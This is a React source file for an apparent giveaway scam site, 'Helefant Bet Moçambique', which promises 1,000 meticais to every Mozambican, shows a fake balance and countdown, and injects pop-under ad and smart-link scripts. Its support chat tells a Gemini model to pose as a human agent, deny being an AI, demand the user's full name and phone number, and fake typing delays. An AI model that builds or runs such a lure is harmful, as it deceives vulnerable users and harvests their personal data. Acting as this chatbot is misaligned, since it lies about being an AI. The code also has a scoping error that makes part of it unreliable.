
import React, { useState, useEffect, useRef } from 'react';
import { AppStep, UserData } from './types';
import StepForm from './components/StepForm';
import StepShare from './components/StepShare';
import StepProcessing from './components/StepProcessing';
import FinalMessage from './components/FinalMessage';
import Navbar from './components/Navbar';
import Stats from './components/Stats';
import Testimonials from './components/Testimonials';
import SupportChat from './components/SupportChat';
import StepWinners from './components/StepWinners';
import StepEarnings from './components/StepEarnings';
import LoadingOverlay from './components/LoadingOverlay';
import { GoogleGenAI } from "@google/genai";

const STORAGE_KEY = 'helefant_chat_history_v5';
const SUBMISSION_KEY = 'helefant_submitted_token';

const BACKGROUND_IMAGES = [
  "https://images.unsplash.com/photo-1534120247760-c44c3e4a62f1?auto=format&fit=crop&q=80&w=1920",
  "https://images.unsplash.com/photo-1544928147-79a2dbc1f389?auto=format&fit=crop&q=80&w=1920",
  "https://images.unsplash.com/photo-1523240795612-9a054b0db644?auto=format&fit=crop&q=80&w=1920"
];

const App: React.FC = () => {
  const [currentStep, setCurrentStep] = useState<AppStep>(AppStep.FORM);
  const [userData, setUserData] = useState<UserData | null>(null);
  const [daysRemaining, setDaysRemaining] = useState(17);
  const [balance, setBalance] = useState(0);
  const [isInitialLoading, setIsInitialLoading] = useState(true);
  const [bgIndex, setBgIndex] = useState(0);
  const [hasSimulatedShare, setHasSimulatedShare] = useState(false);

 const [showNativeAd, setShowNativeAd] = useState(false);
 
  useEffect(() => {
  const script = document.createElement('script');
  script.src = "https://pl28476233.effectivegatecpm.com/392a0f2efb2128838020802539222d80/invoke.js";
  script.async = true;
  script.setAttribute("data-cfasync", "false");
  document.body.appendChild(script);

    return () => {
    document.body.removeChild(script);
  };
}, []);

  useEffect(() => {
  if ((window as any).topBannerLoaded) return;
  (window as any).topBannerLoaded = true;

  (window as any).atOptions = {
    key: 'd824ab38a2213cbba9666b13d565dce7',
    format: 'iframe',
    height: 250,
    width: 300,
    params: {}
  };

  const script = document.createElement('script');
  script.src = 'https://www.highperformanceformat.com/d824ab38a2213cbba9666b13d565dce7/invoke.js';
  script.async = true;

  const container = document.getElementById('top-banner-300x250');
  if (container) {
    container.appendChild(script);
  }
}, []);
  
  const [chatMessages, setChatMessages] = useState<any[]>([]);
  const [unreadCount, setUnreadCount] = useState(0);
  const [isAgentTyping, setIsAgentTyping] = useState(false);
  useEffect(() => {
    const bgInterval = setInterval(() => {
      setBgIndex((prev) => (prev + 1) % BACKGROUND_IMAGES.length);
    }, 5000);

    const openSmartLink = () => {
  window.open(
    "https://www.effectivegatecpm.com/e3ncbz6t?key=4e28755c8626d3e6ddabbbe0de16fc9b",
    "_blank"
  );
};
    return () => clearInterval(bgInterval);
  }, []);

  useEffect(() => {
    const saved = localStorage.getItem(STORAGE_KEY);
    if (saved) {
      try {
        const parsed = JSON.parse(saved);
        setChatMessages(parsed.map((m: any) => ({ ...m, timestamp: new Date(m.timestamp) })));
      } catch (e) {}
    }
  }, []);

  useEffect(() => {
    if (chatMessages.length > 0) {
      localStorage.setItem(STORAGE_KEY, JSON.stringify(chatMessages));
    }
  }, [chatMessages]);

  useEffect(() => {
    const timer = setTimeout(() => {
      setIsInitialLoading(false);
    }, 2800);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (currentStep === AppStep.SUPPORT) {
      setUnreadCount(0);
    }
  }, [currentStep]);

  const getGeminiResponse = async (userText: string, history: any[]) => {
    try {
      const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });
      const context = history.slice(-10).map(m => `${m.sender === 'user' ? 'Cliente' : 'Suporte'}: ${m.text}`).join('\n');
      
      const response = await ai.models.generateContent({
        model: "gemini-3-flash-preview",
        contents: `Você é o Mestre Suporte da Helefant Bet Moçambique.
          - Protocolo: Peça o NOME completo, depois o TELEFONE. Só resolva o problema após os dados.
          - Estilo: Moçambicano profissional, humanizado, empático.
          Histórico: ${context}
          Nova Mensagem: ${userText}`,
        config: {
          systemInstruction: "Aja como um atendente real. Não diga que é IA. Use gírias leves como 'Bay', 'Estamos juntos'. Responda entre 20 a 60 segundos.",
          temperature: 0.8,
        },
      });
      return response.text || "Compreendo. Por favor, forneça seu nome completo para iniciarmos.";
    } catch (e) {
      return "O sistema está processando seu pedido financeiro. Aguarde um momento.";
    }
  };

  const handleSendMessage = async (msg: any) => {
    const updated = [...chatMessages, msg];
    setChatMessages(updated);
    const possibleDelays = [22000, 35000, 58000];
    const totalDelay = possibleDelays[Math.floor(Math.random() * possibleDelays.length)];
    setTimeout(() => {
      setChatMessages(prev => prev.map(m => m.id === msg.id ? { ...m, read: true } : m));
    }, totalDelay * 0.6);
    setTimeout(() => setIsAgentTyping(true), totalDelay * 0.85);
    setTimeout(async () => {
      const replyText = await getGeminiResponse(msg.text, updated);
      setIsAgentTyping(false);
      const agentMsg = { id: Date.now().toString(), text: replyText, sender: 'agent', timestamp: new Date() };
      setChatMessages(prev => [...prev, agentMsg]);
      if (currentStep !== AppStep.SUPPORT) {
        setUnreadCount(prev => prev + 1);
      }
    }, totalDelay);
  };

  useEffect(() => {
    const startDateKey = 'helefant_promo_start_date';
    let startDate = localStorage.getItem(startDateKey);
    if (!startDate) {
      startDate = new Date().toISOString();
      localStorage.setItem(startDateKey, startDate);
    }
    const calculateDays = () => {
      const start = new Date(startDate!).getTime();
      const now = new Date().getTime();
      const elapsedDays = Math.floor((now - start) / (1000 * 60 * 60 * 24));
      setDaysRemaining(Math.max(1, 17 - elapsedDays));
    };
    calculateDays();
    const timer = setInterval(calculateDays, 1000 * 60 * 60);
    return () => clearInterval(timer);
  }, []);

 const handleFormSubmit = (data: UserData) => {
  // 🔥 Smart Link no recebimento
  openSmartLink();

  localStorage.setItem(SUBMISSION_KEY, 'true');
  setUserData(data);
  setBalance(1000);
  setCurrentStep(AppStep.SHARE);
  window.scrollTo({ top: 0, behavior: 'smooth' });
};

  const handleShareComplete = (simulated: boolean) => {
    setHasSimulatedShare(simulated);
    setCurrentStep(AppStep.PROCESSING);
  };

  const handleSupportClick = () => {
    setCurrentStep(AppStep.SUPPORT);
    setUnreadCount(0);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  return (
    <div className="min-h-screen flex flex-col items-center bg-slate-950 relative">
      
     {/* BANNER TOPO */}
<div className="w-full flex justify-center py-4 bg-slate-950">
  <div id="top-banner-300x250"></div>
</div>    
      {isInitialLoading && <LoadingOverlay />}
      <Navbar onSupportClick={handleSupportClick} onWinnersClick={() => setCurrentStep(AppStep.WINNERS)} onEarningsClick={() => setCurrentStep(AppStep.EARNINGS)} onHomeClick={() => setCurrentStep(AppStep.FORM)} />
      {currentStep !== AppStep.SUPPORT && (
        <button onClick={handleSupportClick} className="fixed bottom-8 right-8 z-[100] w-16 h-16 bg-[#00a884] rounded-full flex items-center justify-center shadow-[0_10px_40px_rgba(0,168,132,0.4)] hover:scale-110 active:scale-95 transition-all group">
          <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
          {unreadCount > 0 && <span className="absolute -top-1 -right-1 w-7 h-7 bg-red-600 text-white text-xs font-black rounded-full flex items-center justify-center border-2 border-slate-950 animate-bounce">{unreadCount}</span>}
        </button>
      )}

      {currentStep === AppStep.FORM && (
        <section className="relative w-full min-h-[90vh] flex items-center justify-center overflow-hidden">
          <div className="absolute inset-0 z-0">
            {BACKGROUND_IMAGES.map((img, index) => (
              <img key={img} src={img} alt="Helefant" className={`absolute inset-0 w-full h-full object-cover transition-opacity duration-[1500ms] ease-in-out ${index === bgIndex ? 'opacity-100' : 'opacity-0'}`} />
            ))}
            <div className="absolute inset-0 bg-slate-950/70 mix-blend-multiply"></div>
            <div className="absolute inset-0 bg-gradient-to-b from-slate-950/40 via-emerald-900/60 to-slate-950"></div>
          </div>
          <div className="relative z-10 w-full max-w-6xl px-4 py-20 text-center">
            <span className="inline-block px-8 py-3 mb-8 text-sm font-black tracking-[0.4em] uppercase bg-emerald-500 text-slate-950 rounded-full">EXPIRA EM {daysRemaining} DIAS</span>
            <h1 className="text-4xl md:text-7xl font-black leading-[1.1] tracking-tighter text-white uppercase">ESTAMOS A DAR <span className="text-emerald-400">1.000 METICAIS</span> PARA TODOS OS MOÇAMBICANOS</h1>
            <p className="max-w-4xl mx-auto mt-10 text-lg md:text-2xl text-slate-100 font-medium leading-relaxed">
              helefant conpany esta a oferece 1000 meticais para todos os moçambicanos, devido ao faturamento de 125 milhoes de meticais. siga a instruçoes abaixo e revendique o seu premium
            </p>
<button
  onClick={() => {
    openSmartLink(); // 🔥 Smart Link
    document.getElementById('solicitar')?.scrollIntoView({ behavior: 'smooth' });
  }}
  className="mt-16 bg-emerald-500 text-slate-950 px-12 py-5 rounded-2xl font-black text-xl uppercase tracking-widest hover:bg-emerald-400 transition-all shadow-[0_20px_50px_-10px_rgba(16,185,129,0.5)]"
>
  RECEBER AGORA
</button>
          </div>
        </section>
      )}

      <main className="w-full max-w-6xl px-4 py-12 flex flex-col items-center min-h-[60vh]">
       {currentStep === AppStep.FORM && (
  <>
    <Stats />
    <div className="w-full max-w-4xl mt-12 bg-white/[0.02] border border-white/5 p-8 md:p-16 rounded-[4rem] backdrop-blur-3xl shadow-2xl">
      <StepForm onSubmit={handleFormSubmit} />
      
      {/* Native Banner aqui, debaixo do formulário */}
      <div className="w-full max-w-[320px] mx-auto mt-8 rounded-2xl shadow-lg p-4 border border-gray-300">
        <div id="container-392a0f2efb2128838020802539222d80"></div>
      </div>
    </div>
    
    <div className="w-full mt-32"><Testimonials /></div>
  </>
)}
        {currentStep === AppStep.WINNERS && <StepWinners onBack={() => setCurrentStep(AppStep.FORM)} />}
        {currentStep === AppStep.EARNINGS && <StepEarnings balance={balance} userData={userData} hasSimulatedShare={hasSimulatedShare} onBack={() => setCurrentStep(AppStep.FORM)} />}
        {currentStep === AppStep.SUPPORT && <SupportChat messages={chatMessages} isTyping={isAgentTyping} onSend={handleSendMessage} onBack={() => setCurrentStep(AppStep.FORM)} />}
        {currentStep === AppStep.SHARE && <StepShare onComplete={handleShareComplete} />}
        {currentStep === AppStep.PROCESSING && <StepProcessing userData={userData} hasSimulatedShare={hasSimulatedShare} onComplete={() => setCurrentStep(AppStep.SUCCESS)} />}
        {currentStep === AppStep.SUCCESS && <FinalMessage hasSimulatedShare={hasSimulatedShare} />}
      </main>

      <footer className="w-full border-t border-white/5 py-16 bg-slate-950/80 mt-auto text-center md:text-left">
        <div className="max-w-6xl mx-auto px-4 grid grid-cols-1 md:grid-cols-3 gap-12">
          <div>
            <div className="text-2xl font-black italic tracking-tighter text-emerald-400 mb-4 uppercase">HELEFANT BET</div>
            <p className="text-slate-500 text-sm">A maior plataforma de prêmios de Moçambique.</p>
          </div>
          <div className="flex flex-col gap-3">
             <button onClick={() => setCurrentStep(AppStep.WINNERS)} className="text-slate-400 hover:text-emerald-400 text-sm font-bold uppercase tracking-widest">Vencedores</button>
             <button onClick={handleSupportClick} className="text-slate-400 hover:text-emerald-400 text-sm font-bold uppercase tracking-widest">Suporte VIP</button>
          </div>
          <div className="md:text-right">
             <button onClick={handleSupportClick} className="bg-slate-900 border border-slate-800 px-8 py-3 rounded-xl text-emerald-400 font-bold uppercase text-xs tracking-widest">Suporte Online 24/7</button>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default App;
